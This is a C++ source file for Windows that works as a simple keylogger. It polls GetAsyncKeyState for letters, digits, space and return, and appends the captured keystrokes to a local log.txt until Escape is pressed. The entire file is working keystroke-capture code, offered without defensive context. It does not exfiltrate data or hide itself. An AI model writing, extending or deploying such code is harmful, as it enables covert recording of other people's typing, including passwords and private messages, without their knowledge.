#include <windows.h>
#include <fstream>
#include <sstream>
#include <iostream>

using namespace std;

string input;
string stringKey;
int counter = { 0 };
ofstream output;
boolean pEnd = { false };
boolean lastSpace = { true };
boolean lastReturn = { true };

void keys(char keys);
void flushString();

int main() {

	char chars[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" };

	while (!pEnd) 
	{
		for (int i = 0; i < 36; i++)
		{
			keys(chars[i]);
		}

		if (counter >= 5)
		{
			flushString();
		}

		Sleep(120);
	}

	return 0;
}

void keys(char key)
{
	if (GetAsyncKeyState(key))
	{
		string sKey(1, key);
		input.append(sKey);
		counter++;
		stringKey = "";
		lastSpace = false;
		lastReturn = false;
	}

	if (GetAsyncKeyState(VK_ESCAPE)) {
		pEnd = true;
	}

	if (GetAsyncKeyState(VK_SPACE) && !lastSpace) {
		input.append(" ");
		lastSpace = true;
	}

	if (GetAsyncKeyState(VK_RETURN) && !lastReturn) {
		input.append("\n");
		lastReturn = true;
	}

}

void flushString()
{
	output.open("log.txt", ios::app);
	output << input;
	input = "";
	output.close();
	counter = 0;
}